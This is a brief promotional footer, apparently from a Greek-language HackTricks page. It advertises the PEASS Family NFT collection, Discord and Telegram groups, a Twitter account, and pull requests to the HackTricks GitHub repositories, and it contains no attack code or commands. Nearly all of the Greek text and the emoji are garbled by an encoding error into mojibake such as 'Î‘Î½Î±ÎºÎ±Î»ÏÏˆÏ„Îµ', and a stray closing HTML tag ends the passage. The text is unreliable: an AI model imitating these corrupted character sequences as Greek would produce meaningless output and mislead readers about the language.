* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± hacking tricks ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
